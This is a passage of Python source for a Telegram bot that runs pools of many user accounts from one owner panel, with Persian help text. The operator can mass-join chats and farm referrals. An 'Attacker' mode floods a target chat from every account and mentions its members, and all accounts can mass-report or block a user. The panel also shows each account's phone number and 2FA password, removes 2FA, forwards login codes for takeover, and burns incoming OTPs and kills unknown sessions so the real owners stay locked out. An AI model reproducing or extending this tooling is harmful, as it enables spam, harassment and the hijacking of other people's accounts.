    async def cb_global_joinall(event):
      if not owner_guard(event):
          return await event.answer()
      all_sess = [s for info in groups_db.values() for s in info.get("sessions", [])]
      total = len(all_sess)
      pending_group_selection[OWNER_ID] = {"og_step": "global_join_all"}
      await sp_edit(event,
          f" Join All Accounts به یه گروه/کانال\n"
          f" تعداد کل اکانت‌ها: {total} تا (از همه ریموت‌ها)\n\n"
          f"لینک یا یوزرنیم گروه/کانال رو بفرست:\n"
          f"مثال: @username یا https://t.me/+invite",
          buttons=[[Button.inline("❌ Cancel", b"menu_groups")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"global_startbot_ref"))
    async def cb_global_startbot_ref(event):
      if not owner_guard(event):
          return await event.answer()
      all_sess = [s for info in groups_db.values() for s in info.get("sessions", [])]
      total = len(all_sess)
      pending_group_selection[OWNER_ID] = {"og_step": "global_startbot_ref"}
      await sp_edit(event,
          f" Start Bot با رفرال — همه اکانتا\n"
          f" تعداد: {total} اکانت\n\n"
          f"لینک رفرال ربات رو بفرست:\n"
          f"مثال: https://t.me/somebot?start=ref123\n"
          f"یا فقط: @somebot ref123",
          buttons=[[Button.inline("❌ Cancel", b"menu_groups")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"global_leaveall"))
    async def cb_global_leaveall(event):
      if not owner_guard(event):
          return await event.answer()
      all_sess = [s for info in groups_db.values() for s in info.get("sessions", [])]
      total = len(all_sess)
      pending_group_selection[OWNER_ID] = {"og_step": "global_leave_all"}
      await sp_edit(event,
          f" Leave All Accounts از یه گروه/کانال\n"
          f" تعداد کل اکانت‌ها: {total} تا (از همه ریموت‌ها)\n\n"
          f"لینک یا یوزرنیم گروه/کانال رو بفرست:\n"
          f"مثال: @username یا https://t.me/joinchat/xxx",
          buttons=[[Button.inline("❌ Cancel", b"menu_groups")]])
      await event.answer()

    # ── callback: group detail ────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=b"grp_(.+)"))
    async def cb_group_detail(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      info = groups_db.get(gname, {})
      sessions_list = info.get("sessions", [])
      sess_text = "\n".join([f"  • {s} ({'🟢' if s in managed else '🔴'})" for s in sessions_list]) or "  خالی"
      online = sum(1 for s in sessions_list if s in managed)
      max_acc = info.get("max_accounts")
      max_str = f"{max_acc} اکانت" if max_acc else "بدون محدودیت"
      text = (
          f" ریموت: {gname}\n"
          f"━━━━━━━━━━━━━━\n"
          f"مالک: {info.get('owner')}\n"
          f"سقف اکانت: {max_str}\n"
          f"اشتراک: {group_expiry_label(gname)}\n"
          f"اکانت‌ها ({len(sessions_list)} | آنلاین: {online}):\n{sess_text}"
      )
      btns = []
      btns.append([Button.inline("👥 کنترل ریموت", f"og_home_{gname}".encode())])
      if owner_guard(event):
          btns.append([Button.inline("🔢 تغییر سقف اکانت", f"setmax_{gname}".encode()),
                         Button.inline("⏳ تنظیم اشتراک", f"setsub_{gname}".encode())])
          btns.append([Button.inline("🔄 Change Owner", f"chgowner_{gname}".encode()),
                         Button.inline("🗑 Delete Group", f"delgroup_{gname}".encode())])
          btns.append([Button.inline("🔙 Back", b"menu_groups")])
      else:
          btns.append([Button.inline("🔙 Back to Panel", f"og_home_{gname}".encode())])
      await sp_edit(event, text, buttons=btns)
      await event.answer()

    # ── تغییر سقف اکانت ریموت ────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"setmax_(.+)")))
    async def setmax_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not owner_guard(event):
          return await event.answer(" فقط اونر اصلی", alert=True)
      if gname not in groups_db:
          return await event.answer(" ریموت وجود ندارد", alert=True)
      cur = groups_db[gname].get("max_accounts")
      cur_str = f"{cur} اکانت" if cur else "بدون محدودیت"
      pending_group_selection[OWNER_ID] = {"waiting_setmax": True, "setmax_gname": gname}
      await sp_edit(event,
          f"🔢 تغییر سقف اکانت ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
          f"سقف فعلی: {cur_str}\n\n"
          f"عدد جدید رو بنویس (مثلاً 5)، یا 0 برای بدون محدودیت:",
          buttons=[[Button.inline("❌ Cancel", f"grp_{gname}".encode())]])
      await event.answer()

    # ── تنظیم اشتراک (زمان‌بندی) ریموت ───────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"setsub_(.+)")))
    async def setsub_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not owner_guard(event):
          return await event.answer(" فقط اونر اصلی", alert=True)
      if gname not in groups_db:
          return await event.answer(" ریموت وجود ندارد", alert=True)
      pending_group_selection[OWNER_ID] = {"waiting_setsub": True, "setsub_gname": gname}
      await sp_edit(event,
          f"⏳ تنظیم اشتراک ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
          f"وضعیت فعلی: {group_expiry_label(gname)}\n\n"
          f"تعداد روز اعتبار رو از الان بنویس (مثلاً 30)، یا 0 برای بدون محدودیت زمانی:",
          buttons=[[Button.inline("❌ Cancel", f"grp_{gname}".encode())]])
      await event.answer()

    # ── تغییر اونر گروه ──────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"chgowner_(.+)")))
    async def chgowner_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[OWNER_ID] = {"waiting_changeowner": True, "change_owner_gname": gname}
      await sp_edit(event,
          f" آیدی عددی اونر جدید برای ریموت «{gname}»:\n"
          f"(مثال: 123456789)",
          buttons=[[Button.inline("❌ Cancel", f"grp_{gname}".encode())]])
      await event.answer()

    # ── حذف گروه ─────────────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"delgroup_(.+)")))
    async def delgroup_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event,
          f" آیا مطمئنی ریموت «{gname}» حذف بشه؟\n(اکانت‌ها حذف نمیشن)",
          buttons=[
              [Button.inline("✅ Yes, Delete", f"delgroupok_{gname}".encode()),
                 Button.inline("❌ No", f"grp_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"delgroupok_(.+)")))
    async def delgroupok_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      if gname in groups_db:
          del groups_db[gname]
          save_groups()
      await sp_edit(event, f" ریموت «{gname}» حذف شد.",
                     buttons=[[Button.inline("👥 Groups", b"menu_groups")]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP FULL PANEL  (og_ prefix — no separate bot needed)
    # ═══════════════════════════════════════════════════════════
    def og_sessions(gname):
      return groups_db.get(gname, {}).get("sessions", [])

    def _session_group(sn: str):
      """Returns (gname, ginfo) for the group this session belongs to, or (None, {})."""
      for gname, ginfo in groups_db.items():
          if sn in ginfo.get("sessions", []):
              return gname, ginfo
      return None, {}

    def og_menu(gname, uid: int = None):
      lang = og_panel_lang.get(uid, "fa") if uid is not None else "fa"
      cnt = len(og_sessions(gname))
      online = sum(1 for s in og_sessions(gname) if s in managed)
      atk = groups_db.get(gname, {}).get("attacker", {})
      atk_active = atk.get("active", False)
      atk_icon = "🟢" if atk_active else "⚔️"
      adm_cnt = len(groups_db.get(gname, {}).get("og_admins", []))
      # anti-ban status for this group
      g_sessions = og_sessions(gname)
      ab_on = sum(1 for s in g_sessions if anti_ban_enabled.get(s, True))
      ab_icon = "🛡" if ab_on == len(g_sessions) and g_sessions else ("⚠️" if ab_on > 0 else "🔓")
      g_info    = groups_db.get(gname, {})
      g_burn    = g_info.get("otp_burn", False)
      g_guard   = g_info.get("session_guard", False)
      # ── label pairs: (fa, en) — words like "اتکر"/"سلف" that already read fine
      # in both languages just keep one consistent transliterated form.
      if lang == "en":
          L = {
              "accounts": "Accounts", "jl": "Join / Leave", "self": "Self", "profile": "Profile",
              "blockid": "Block by ID (All)", "report": "Report User (All)", "attacker": "Attacker",
              "miotx": "Mio Transfer",
              "sched": "Scheduled Send", "rhythm": "Rhythm", "antiban": "Anti-Ban", "bulk": "Bulk Action",
              "clean": "Clean Account", "on_all": "Turn On All", "off_all": "Turn Off All",
              "phones": "Account Phone Numbers", "keys2fa": "2FA Keys", "dis2fa": "Disable 2FA",
              "killsess": "Clear Sessions", "checkstatus": "Check Status",
              "burn_on": "🔥 OTP Burn: ON 🟢", "burn_off": "🔥 OTP Burn: OFF 🔴",
              "guard_on": "🛡 Session Guard: ON 🟢", "guard_off": "🛡 Session Guard: OFF 🔴",
              "trusted": "Trusted Devices", "settings": "Settings", "admins": "Admins",
              "help": "Full Feature Guide", "back": "Back to Group", "lang_toggle": "🌐 فارسی",
          }
      else:
          L = {
              "accounts": "حساب‌ها", "jl": "جوین / لفت", "self": "سلف", "profile": "پروفایل",
              "blockid": "مسدود کردن با آیدی (همه)", "report": "ریپورت کاربر (همه)", "attacker": "اتکر",
              "miotx": "انتقال میویی",
              "sched": "ارسال زمانبندی", "rhythm": "ریتم", "antiban": "آنتی‌بن", "bulk": "عملیات گروهی",
              "clean": "پاکسازی اکانت", "on_all": "روشن کردن همه", "off_all": "خاموش کردن همه",
              "phones": "شماره‌های اکانت‌ها", "keys2fa": "کلیدهای 2FA", "dis2fa": "خاموش کردن 2FA",
              "killsess": "پاک‌سازی نشست‌ها", "checkstatus": "بررسی وضعیت",
              "burn_on": "🔥 OTP Burn: روشن 🟢", "burn_off": "🔥 OTP Burn: خاموش 🔴",
              "guard_on": "🛡 Session Guard: روشن 🟢", "guard_off": "🛡 Session Guard: خاموش 🔴",
              "trusted": "دستگاه‌های مورد اعتماد", "settings": "تنظیمات", "admins": "ادمین‌ها",
              "help": "راهنمای کامل قابلیت‌ها", "back": "بازگشت به گروه", "lang_toggle": "🌐 English",
          }
      burn_lbl  = L["burn_on"]  if g_burn  else L["burn_off"]
      guard_lbl = L["guard_on"] if g_guard else L["guard_off"]
      return [
          [Button.inline(f"👤 {L['accounts']} ({cnt}) {online}", f"og_accs_{gname}".encode()),],
          [Button.inline(f"➡️ {L['jl']}", f"og_jl_{gname}".encode())],
          [Button.inline(f"🤖 {L['self']}", f"og_enemy_{gname}".encode()),
             Button.inline(f"👤 {L['profile']}", f"og_profile_{gname}".encode())],
          [Button.inline(f"📌 {L['blockid']}", f"og_blockid_{gname}".encode()),
             Button.inline(f"📌 {L['report']}", f"og_report_{gname}".encode())],
          [Button.inline(f"⚔️ {atk_icon} {L['attacker']}", f"ogatk_panel_{gname}".encode())],
          [Button.inline(f"🪙 {L['miotx']}", f"ogmiotx_panel_{gname}".encode())],
          [Button.inline(f"⏰ {L['sched']}", f"og_sched_{gname}".encode())],
          [Button.inline(f"🔘 {L['rhythm']}", f"og_rhmh_{gname}".encode()),
             Button.inline(f"🔢 {ab_icon} {L['antiban']}", f"og_antibn_{gname}".encode())],
          [Button.inline(f"📦 {L['bulk']}", f"og_act_{gname}".encode())],
          [Button.inline(f"👤 {L['clean']}", f"og_clean_{gname}".encode())],
          [Button.inline(f"📌 {L['on_all']}", f"og_enableall_{gname}".encode()),
             Button.inline(f"📌 {L['off_all']}", f"og_disableall_{gname}".encode())],
          [Button.inline(f"📌 {L['phones']}", f"og_phones_{gname}".encode())],
          [Button.inline(f"🔑 {L['keys2fa']}", f"og_2falist_{gname}".encode()),
             Button.inline(f"📌 {L['dis2fa']}", f"og_dis2fa_{gname}".encode())],
          [Button.inline(f"🗑 {L['killsess']}", f"og_killsess_{gname}".encode()),
             Button.inline(f"📊 {L['checkstatus']}", f"og_checkstatus_{gname}".encode())],
          [Button.inline(burn_lbl,  f"og_otp_burn_{gname}".encode()),
             Button.inline(guard_lbl, f"og_sess_guard_{gname}".encode())],
          [Button.inline(f"📱 {L['trusted']} ({len(groups_db.get(gname,{}).get('trusted_devices',[]))})", f"og_trusted_devices_{gname}".encode())],
          [Button.inline(f"⚙️ {L['settings']}", f"og_settings_{gname}".encode()),
             Button.inline(f"👮 {L['admins']} ({adm_cnt})", f"og_admins_{gname}".encode())],
          [Button.inline(L["lang_toggle"], f"og_lang_{gname}".encode())],
          [Button.inline(f"❓ {L['help']}", f"og_help_{gname}|0".encode())],
          [Button.inline(f"🔙 {L['back']}", f"grp_{gname}".encode())],
      ]

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_lang_(.+)")))
    async def og_lang_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      uid = event.sender_id
      cur = og_panel_lang.get(uid, "fa")
      og_panel_lang[uid] = "en" if cur == "fa" else "fa"
      cnt = len(og_sessions(gname))
      online = sum(1 for s in og_sessions(gname) if s in managed)
      if og_panel_lang[uid] == "en":
          txt = (f" Remote management: {gname}\n━━━━━━━━━━━━━━━━━━━━\n"
                   f" Accounts: {cnt}   Online: {online}\n"
                   f"Pick an option:")
      else:
          txt = (f" مدیریت ریموت: {gname}\n━━━━━━━━━━━━━━━━━━━━\n"
                   f" اکانت: {cnt}   آنلاین: {online}\n"
                   f"یه گزینه انتخاب کن:")
      await sp_edit(event, txt, buttons=og_menu(gname, uid))
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_home_(.+)")))
    async def og_home_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not _og_has_permission(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      if event.sender_id != OWNER_ID and is_group_expired(gname):
          await sp_edit(event,
              f"⚠️ ریموت «{gname}»\n━━━━━━━━━━━━━━\n"
              f"اشتراک این ریموت منقضی شده.\n"
              f"لطفاً اشتراک خود را آپدیت کنید.",
              buttons=[[Button.inline("🔄 Refresh", f"og_home_{gname}".encode())]])
          return await event.answer()
      cnt = len(og_sessions(gname))
      online = sum(1 for s in og_sessions(gname) if s in managed)
      txt = (
          f" مدیریت ریموت: {gname}\n"
          f"━━━━━━━━━━━━━━━━━━━━\n"
          f" اکانت: {cnt}   آنلاین: {online}\n"
          f"یه گزینه انتخاب کن:"
      )
      await sp_edit(event, txt, buttons=og_menu(gname, event.sender_id))
      await event.answer(" رفرش شد")

    # ── راهنمای کامل قابلیت‌ها (چند صفحه) ───────────────────────
    _OG_HELP_PAGES = [
        (
            "❓ راهنما — صفحه ۱/۵\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "👤 <b>Accounts</b>\n"
            "لیست همه اکانت‌های این ریموت. آیکون 🟢 = آنلاین، 🔴 = آفلاین.\n"
            "روی هر اکانت بزنی جزئیات، وضعیت، و گزینه‌های مدیریت اون رو می‌بینی.\n"
            "• <b>➕ افزودن اکانت</b> — اکانت‌هایی که توی سیستمن ولی توی این ریموت نیستن رو اضافه کن.\n"
            "• <b>➖ حذف از ریموت</b> — اکانت فقط از این ریموت برداشته میشه، از سیستم پاک نمیشه.\n"
            "• <b>🗑 حذف کامل</b> — اکانت کاملاً از سیستم و سشن فایل پاک میشه.\n"
            "• <b>👥 Move</b> — اکانت رو به ریموت دیگه منتقل کن.\n\n"
            "➡️ <b>Join / Leave</b>\n"
            "همه اکانت‌های ریموت رو به یه کانال/گروه جوین یا لفت بده.\n"
            "• Join All / Leave All — همه باهم موازی\n"
            "• Join One / Leave One — انتخاب اکانت خاص\n"
            "لینک جوین، یوزرنیم (@grup) یا آی‌دی عددی رو بفرست."
        ),
        (
            "❓ راهنما — صفحه ۲/۵\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🤖 <b>Self</b>\n"
            "حملات Self — پیام/فوروارد/رسانه به خود اکانت‌ها.\n\n"
            "👤 <b>Profile</b>\n"
            "تغییر عکس پروفایل، نام، بایو اکانت‌های ریموت به‌صورت دسته‌جمعی.\n\n"
            "📌 <b>Block by ID / Report User</b>\n"
            "همه اکانت‌های ریموت یه یوزر مشخص رو بلاک یا ریپورت می‌کنن.\n\n"
            "⚔️ <b>Attacker</b>\n"
            "ارسال پیام/رسانه/فوروارد به یه چت هدف به‌صورت مداوم با همه اکانت‌های آنلاین.\n"
            "• Target — آی‌دی یا لینک چت هدف\n"
            "• Delay — فاصله بین هر دور ارسال (ثانیه)\n"
            "• Items — متن‌ها، رسانه‌ها، فوروارد‌هایی که دوره‌ای ارسال میشن\n"
            "• Mention — منشن همه اعضای گروه هدف در هر پیام\n"
            "وقتی Attacker روشنه، همه اکانت‌های آنلاین موازی ارسال می‌کنن."
        ),
        (
            "❓ راهنما — صفحه ۳/۵\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⏰ <b>ارسال زمانبندی</b>\n"
            "پیام/رسانه رو برنامه‌ریزی کن تا در یه زمان مشخص فرستاده بشه.\n"
            "چندین زمانبندی موازی می‌تونی تنظیم کنی.\n\n"
            "🔘 <b>Rhythm</b>\n"
            "ارسال خودکار پیام در بازه‌های زمانی تکرارشونده (loop) به چت هدف.\n\n"
            "🛡 <b>Anti-Ban</b>\n"
            "هر ۶۰ ثانیه وضعیت اکانت‌ها رو چک می‌کنه.\n"
            "اگه اکانتی بَن یا ریستریکت بشه، فوری آفلاین میشه و بهت اطلاع داده میشه.\n\n"
            "📦 <b>Bulk Action</b>\n"
            "عملیات دسته‌جمعی روی همه اکانت‌های ریموت:\n"
            "• ارسال پیام/رسانه به چت مقصد با همه اکانت‌ها\n"
            "• فوروارد پیام از یه چت به چت دیگه با همه اکانت‌ها\n\n"
            "👤 <b>Clean Account</b>\n"
            "پاک‌سازی تاریخچه، عکس پروفایل، بایو و مخاطبین اکانت‌های ریموت."
        ),
        (
            "❓ راهنما — صفحه ۴/۵\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <b>Turn On / Turn Off All</b>\n"
            "همه اکانت‌های ریموت رو باهم روشن (آنلاین) یا خاموش کن.\n\n"
            "📌 <b>شماره‌های اکانت‌ها</b>\n"
            "لیست شماره تلفن همه اکانت‌های این ریموت.\n\n"
            "🔑 <b>کلیدهای 2FA</b>\n"
            "رمزهای تأیید دو مرحله‌ای اکانت‌ها رو ببین.\n\n"
            "📌 <b>خاموش کردن 2FA</b>\n"
            "رمز دو مرحله‌ای همه اکانت‌های ریموت رو حذف کن (اگه رمز ذخیره‌شده داشته باشن).\n\n"
            "🗑 <b>پاک‌سازی نشست‌ها</b>\n"
            "سشن‌های فعال اکانت‌ها از دستگاه‌های دیگه رو terminate کن.\n"
            "⚠️ فقط سشن‌های خارجی پاک میشن — کانکشن ربات دست نمیخوره.\n\n"
            "📊 <b>بررسی وضعیت</b>\n"
            "وضعیت آنلاین/آفلاین، بَن، ریستریکت و اعتبار همه اکانت‌ها رو یکجا نشون میده."
        ),
        (
            "❓ راهنما — صفحه ۵/۵\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔥 <b>OTP Burn</b>\n"
            "وقتی روشنه، هر کدی که از تلگرام (۷۷۷۰۰۰) برای اکانت‌های این ریموت بیاد،\n"
            "فوری «مصرف» میشه — یعنی ربات باهاش sign_in می‌کنه تا کد باطل بشه.\n"
            "کسی که دزدکی کد گرفته نمی‌تونه واردشه.\n\n"
            "🛡 <b>Session Guard</b>\n"
            "هر ۵ ثانیه همه سشن‌های فعال اکانت‌ها رو چک می‌کنه.\n"
            "هر سشن ناشناسی (که از ابتدا whitelist نشده) فوری terminate میشه.\n"
            "سشن فعلی ربات و Trusted Devices هرگز لمس نمیشن.\n\n"
            "📱 <b>Trusted Devices</b>\n"
            "دستگاه‌هایی که Session Guard نباید terminate‌شون کنه.\n"
            "• اسکن — همه دستگاه‌های متصل به اکانت‌های آنلاین ریموت رو نشون میده\n"
            "• ➕ — دستگاه رو به whitelist اضافه کن\n"
            "• ✅ — دستگاه قبلاً trusted هست\n\n"
            "⚙️ <b>Settings</b> — تنظیمات ریموت (نام، اونر، سقف اکانت)\n"
            "👮 <b>Admins</b> — ادمین‌هایی که به این پنل دسترسی دارن رو مدیریت کن\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💡 برای هر قابلیت کافیه دکمه‌اش رو بزنی — همه چیز step-by-step راهنماییت می‌کنه."
        ),
    ]

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_help_([^|]+)\|(\d+)")))
    async def og_help_cb(event):
        gname = event.pattern_match.group(1).decode()
        if not og_guard(event, gname):
            return await event.answer(" دسترسی ندارید", alert=True)
        page = int(event.pattern_match.group(2))
        total = len(_OG_HELP_PAGES)
        page = max(0, min(page, total - 1))
        nav = []
        if page > 0:
            nav.append(Button.inline("◀️ قبلی", f"og_help_{gname}|{page - 1}".encode()))
        if page < total - 1:
            nav.append(Button.inline("▶️ بعدی", f"og_help_{gname}|{page + 1}".encode()))
        btns = [nav] if nav else []
        btns.append([Button.inline("🔙 بازگشت به پنل ریموت", f"og_home_{gname}".encode())])
        await sp_edit(event, _OG_HELP_PAGES[page], buttons=btns, parse_mode="html")
        await event.answer()

    # accounts list

    # ── per-group OTP Burn toggle ──────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_otp_burn_(.+)")))
    async def og_otp_burn_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      cur = groups_db.get(gname, {}).get("otp_burn", False)
      groups_db.setdefault(gname, {})["otp_burn"] = not cur
      save_groups()
      status = "🟢 روشن" if not cur else "🔴 خاموش"
      detail = (
          "🔥 OTP Burn فعال — کدهای ورود فوری مصرف می‌شن تا کسی نتونه وارد اکانت بشه."
          if not cur else
          "🔥 OTP Burn خاموش شد."
      )
      await event.answer(f"OTP Burn: {status}", alert=True)
      cnt = len(og_sessions(gname))
      online = sum(1 for s in og_sessions(gname) if s in managed)
      txt = (f" مدیریت ریموت: {gname}\n━━━━━━━━━━━━━━━━━━━━\n"
               f" اکانت: {cnt}   آنلاین: {online}\n{detail}")
      await sp_edit(event, txt, buttons=og_menu(gname, event.sender_id))

    # ── per-group Session Guard toggle ─────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_sess_guard_(.+)")))
    async def og_sess_guard_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      cur = groups_db.get(gname, {}).get("session_guard", False)
      await event.answer()
      if not cur:
          # دارند روشن می‌کنند — اول هشدار اعتمادسازی بده
          td_count = len(groups_db.get(gname, {}).get("trusted_devices", []))
          warn = (
              f"⚠️ Session Guard — ریموت «{gname}»\n"
              f"━━━━━━━━━━━━━━\n"
              f"آیا دستگاه خود را اعتمادسازی کرده‌اید؟\n\n"
              f"اگر دستگاهتان را Trusted نکرده باشید، "
              f"بلافاصله بعد از روشن شدن گارد از اکانت‌ها بیرون می‌افتید!\n\n"
              f"📱 Trusted Devices این ریموت: {td_count} دستگاه\n\n"
              f"برای اعتمادسازی:\n"
              f"منوی ریموت ← 📱 Trusted Devices ← اسکن و اضافه کردن دستگاه"
          )
          await sp_edit(event, warn, buttons=[
              [Button.inline("✅ بله، اعتمادسازی کردم — روشن کن", f"og_sess_guard_confirm_{gname}".encode())],
              [Button.inline("❌ انصراف", f"og_home_{gname}".encode())],
          ])
      else:
          # خاموش کردن — مستقیم اعمال کن
          groups_db.setdefault(gname, {})["session_guard"] = False
          save_groups()
          global SESSION_GUARD_ENABLED, _session_guard_task
          any_guard_on = any(
              gi.get("session_guard", False)
              for gi in groups_db.values()
              if gi.get("sessions")
          )
          if not any_guard_on and SESSION_GUARD_ENABLED:
              SESSION_GUARD_ENABLED = False
              if _session_guard_task and not _session_guard_task.done():
                  _session_guard_task.cancel()
              _session_guard_task = None
          cnt = len(og_sessions(gname))
          online = sum(1 for s in og_sessions(gname) if s in managed)
          await sp_edit(event,
              f" مدیریت ریموت: {gname}\n━━━━━━━━━━━━━━━━━━━━\n"
              f" اکانت: {cnt}   آنلاین: {online}\n🛡 Session Guard خاموش شد.",
              buttons=og_menu(gname, event.sender_id))

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_sess_guard_confirm_(.+)")))
    async def og_sess_guard_confirm_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await event.answer()
      groups_db.setdefault(gname, {})["session_guard"] = True
      save_groups()
      global SESSION_GUARD_ENABLED, _session_guard_task
      any_guard_on = any(
          gi.get("session_guard", False)
          for gi in groups_db.values()
          if gi.get("sessions")
      )
      if any_guard_on and not SESSION_GUARD_ENABLED:
          SESSION_GUARD_ENABLED = True
          _session_guard_task = asyncio.create_task(global_session_guard())
      cnt = len(og_sessions(gname))
      online = sum(1 for s in og_sessions(gname) if s in managed)
      await sp_edit(event,
          f" مدیریت ریموت: {gname}\n━━━━━━━━━━━━━━━━━━━━\n"
          f" اکانت: {cnt}   آنلاین: {online}\n"
          f"🛡 Session Guard فعال شد — نشست‌های غیرمجاز terminate می‌شن.",
          buttons=og_menu(gname, event.sender_id))


    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_accs_(.+)")))
    async def og_accs_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      rows = []
      for s in sessions:
          icon = "🟢" if s in managed else "🔴"
          meta = managed.get(s)
          dn = (meta["state"].get("display_name") or s) if meta else s
          rows.append([Button.inline(f"🔢 {icon} {dn}", f"og_sess_{gname}|{s}".encode())])
      rows.append([Button.inline("➕ افزودن اکانت به ریموت", f"og_addacc_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      cnt = len(sessions)
      online = sum(1 for s in sessions if s in managed)
      txt = f"📱 اکانت‌های ریموت «{gname}»\n━━━━━━━━━━━━━━\nکل: {cnt}   آنلاین: {online}" if sessions else f"📱 ریموت «{gname}»\nهیچ اکانتی نیست.\n\nبا دکمه زیر اکانت اضافه کن."
      await sp_edit(event, txt, buttons=rows)
      await event.answer()

    # session detail in owner group panel
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_sess_([^|]+)\|(.+)")))
    async def og_sess_detail(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      info = sessions_db.get(sess, {})
      meta = managed.get(sess)
      status = "🟢 آنلاین" if meta else "🔴 آفلاین"
      ids = list(meta["state"].get("locked_users", set())) if meta else []
      phone = info.get("phone", "?")
      twofa = info.get("twofa", "")
      otp_active = sess in owner_takeover_pending
      otp_status = "🔔 فعال" if otp_active else "🔕 غیرفعال"
      # check report/restriction status
      report_status = " در حال بررسی..."
      if meta:
          report_status = await _check_report_status(meta["client"])
      else:
          report_status = " آفلاین — قابل بررسی نیست"
      txt = (
          f" {sess}\n━━━━━━━━━━━━━━\n"
          f" شماره: {phone}\n"
          f"{'🔐 2FA: ' + twofa + chr(10) if twofa else ''}"
          f"وضعیت: {status}\n"
          f" ریپورت: {report_status}\n"
          f"فوروارد کد: {otp_status}\n"
          f"آیدی‌ها: {', '.join(str(x) for x in ids) or '—'}"
      )
      otp_btn = (
          Button.inline("🔴 Disable Code Forward", f"og_otp_off_{gname}|{sess}".encode())
          if otp_active else
          Button.inline("🟢 Enable Code Forward", f"og_otp_on_{gname}|{sess}".encode())
      )
      toggle_btn = (
          Button.inline("👤 Turn Off Account", f"og_tog_off_{gname}|{sess}".encode())
          if meta else
          Button.inline("👤 Turn On Account", f"og_tog_on_{gname}|{sess}".encode())
      )
      await sp_edit(event, txt, buttons=[
          [toggle_btn],
          [otp_btn],
          [Button.inline("🔘 Retry Report", f"og_sess_{gname}|{sess}".encode())],
          [Button.inline("👥 Move to Other Group", f"og_moveto_{gname}|{sess}".encode())],
          [Button.inline("➖ حذف از این ریموت", f"og_remfromgrp_{gname}|{sess}".encode())],
          [Button.inline("🗑 حذف کامل اکانت", f"og_delacc_{gname}|{sess}".encode())],
          [Button.inline("🔙 Back", f"og_accs_{gname}".encode())],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_otp_on_([^|]+)\|(.+)")))
    async def og_otp_on_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer()
      sess = event.pattern_match.group(2).decode()
      info = sessions_db.get(sess, {})
      phone = info.get("phone", "?")
      twofa = info.get("twofa", "")
      owner_takeover_pending[sess] = {
          "phone": phone,
          "twofa": twofa,
          "chat_id": event.chat_id,
      }
      await event.answer(" فوروارد کد فعال شد", alert=True)
      await event.edit(buttons=[
          [Button.inline("🔴 Disable Code Forward", f"og_otp_off_{gname}|{sess}".encode())],
          [Button.inline("🔙 Back", f"og_accs_{gname}".encode())],
      ])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_otp_off_([^|]+)\|(.+)")))
    async def og_otp_off_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer()
      sess = event.pattern_match.group(2).decode()
      owner_takeover_pending.pop(sess, None)
      await event.answer(" فوروارد کد غیرفعال شد", alert=True)
      await event.edit(buttons=[
          [Button.inline("🟢 Enable Code Forward", f"og_otp_on_{gname}|{sess}".encode())],
          [Button.inline("🔙 Back", f"og_accs_{gname}".encode())],
      ])

    # ── move session to another group ─────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_moveto_([^|]+)\|(.+)")))
    async def og_moveto_cb(event):
      gname = event.pattern_match.group(1).decode()
      sess  = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" فقط اونر", alert=True)
      other_groups = [g for g in groups_db if g != gname]
      if not other_groups:
